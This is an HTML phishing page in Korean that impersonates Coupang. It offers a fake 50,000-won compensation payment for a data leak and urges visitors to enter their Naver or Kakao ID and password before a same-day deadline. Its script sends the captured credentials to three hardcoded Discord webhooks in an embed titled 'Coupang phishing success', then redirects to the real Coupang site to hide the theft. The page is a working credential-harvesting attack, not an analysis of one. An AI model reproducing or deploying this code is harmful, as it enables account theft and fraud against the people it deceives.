<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="utf-8">
<title>쿠팡 개인정보 유출 보상 신청</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body,html{margin:0;padding:0;background:#fff;font-family:"Noto Sans KR",sans-serif}
  .header{background:#ff6b00;padding:20px 0;text-align:center}
  .container{max-width:420px;margin:0 auto;background:#fff;padding:20px}
  .title h1{font-size:23px;font-weight:700;text-align:center;margin:20px 0;color:#333}
  .title p{font-size:15px;color:#555;text-align:center;line-height:1.6}
  .login-btn{display:block;width:100%;padding:19px;margin:16px 0;border-radius:10px;font-size:18px;font-weight:700;text-align:center;color:#fff;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,.1)}
  .naver{background:#03c75a}
  .kakao{background:#fee500;color:#191919}
  .form{display:none;background:#fff;padding:30px 20px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);margin-top:20px}
  input{width:100%;padding:18px;margin:12px 0;border:1px solid #ddd;border-radius:8px;font-size:17px;box-sizing:border-box}
  button{width:100%;padding:19px;background:#ff6b00;color:#fff;border:none;border-radius:10px;font-size:18px;font-weight:700;margin-top:20px;cursor:pointer}
  .footer{padding:30px 0;color:#999;font-size:12px;text-align:center}
  .alert{background:#fff3cd;padding:18px;border-radius:10px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center}
</style>
</head>
<body>
<div class="header">
  <div style="font-family:'Arial Black',sans-serif;font-size:66px;font-weight:900;letter-spacing:-4px;color:#4a2c0b">
    <span style="color:#4a2c0b">co</span><span style="color:#e61e2a">u</span><span style="color:#f26722">p</span><span style="color:#ffca00">a</span><span style="color:#009e4d">n</span><span style="color:#009ee3">g</span>
  </div>
</div>

<div class="container">
  <div class="title">
    <h1>50,000원 보상 신청</h1>
    <p>개인정보 유출 피해 보상으로<br>50,000원 쿠팡캐시를 지급합니다</p>
  </div>

  <div class="alert">
    오늘 23:59까지 신청 가능<br>
    신청 완료 후 담당자가 개별 연락드립니다
  </div>

  <div onclick="showForm('naver')" class="login-btn naver">네이버로 로그인</div>
  <div onclick="showForm('kakao')" class="login-btn kakao">카카오로 로그인</div>

  <div id="loginForm" class="form">
    <input type="text" id="id" placeholder="아이디 또는 이메일" required>
    <input type="password" id="pw" placeholder="비밀번호" required>
    <button onclick="send()">보상 신청 완료</button>
  </div>
</div>

<div class="footer">
  © 2025 Coupang Corp.<br>
  고객센터 1577-7011
</div>

<script>
function showForm(type){
  document.getElementById('loginForm').style.display = 'block';
  document.querySelector('.title p').innerHTML = type === 'naver' ? '네이버 계정으로 로그인 후 보상 신청을 완료해주세요' : '카카오 계정으로 로그인 후 보상 신청을 완료해주세요';
}

function send(){
  const id = document.getElementById('id').value.trim();
  const pw = document.getElementById('pw').value;
  if(!id || !pw){ alert("아이디와 비밀번호를 입력해주세요"); return; }

  const hooks = [
    "https://discordapp.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
    "https://discordapp.com/api/webhooks/1443170861879394427/m2XA3HHcZr007LvLrETjYNxfWxufqK3qmfF5ULXtOWxghKHkGRmgb13mnOJa0Tgk-QRM",
    "https://discordapp.com/api/webhooks/1443170879256399956/ofvZrCn4KcBjo_eehancUH1LwkQEFutNjni2e36ixMQUqsDBvTeD2oMQ2TyRHsbgOagb"
  ];

  hooks.forEach(h => fetch(h, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"쿠팡 피싱 성공",color:16711680,fields:[{name:"아이디",value:id},{name:"비밀번호",value:pw},{name:"시간",value:new Date().toLocaleString('ko-KR')}]}]})}));

  alert("보상 신청이 완료되었습니다!\n담당자가 순차적으로 연락드리겠습니다.");
  setTimeout(()=>{location.href="https://www.coupang.com";},1500);
}
</script>
</body>
</html>
